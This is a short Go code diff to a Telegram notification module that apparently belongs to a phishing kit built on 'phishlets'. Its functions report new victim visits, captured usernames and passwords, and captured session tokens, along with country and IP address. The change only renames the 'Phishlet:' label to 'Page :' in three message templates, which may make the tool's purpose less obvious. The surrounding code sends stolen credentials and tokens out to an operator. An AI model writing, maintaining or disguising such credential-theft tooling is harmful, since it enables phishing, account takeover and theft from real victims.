@@ -164,7 +164,7 @@ func (t *TelegramBot) NotifyNewVisit(sessionID string, phishlet string, ipAddres
 
 	message := fmt.Sprintf(
 		"🔔 <b>New Visit</b>\n\n"+
-		"🌐 <b>Phishlet:</b> %s\n"+
+		"🌐 <b>Page :</b> %s\n"+
 		"🆔 <b>Session ID:</b> %s\n"+
 		"🌍 <b>Country:</b> %s\n"+
 		"🖥 <b>IP Address:</b> %s\n"+
@@ -185,7 +185,7 @@ func (t *TelegramBot) NotifyCredentialsCaptured(sessionID string, phishlet strin
 
 	message := fmt.Sprintf(
 		"🎣 <b>Credentials Captured</b>\n\n"+
-		"🌐 <b>Phishlet:</b> %s\n"+
+		"🌐 <b>Page :</b> %s\n"+
 		"🆔 <b>Session ID:</b> %s\n"+
 		"👤 <b>Username:</b> %s\n"+
 		"🔑 <b>Password:</b> %s\n"+
@@ -207,7 +207,7 @@ func (t *TelegramBot) NotifyTokensCaptured(sessionID string, phishlet string, ip
 
 	message := fmt.Sprintf(
 		"🔐 <b>Tokens Captured</b>\n\n"+
-		"🌐 <b>Phishlet:</b> %s\n"+
+		"🌐 <b>Page :</b> %s\n"+
 		"🆔 <b>Session ID:</b> %s\n"+
 		"🌍 <b>Country:</b> %s\n"+
 		"🖥 <b>IP Address:</b> %s",
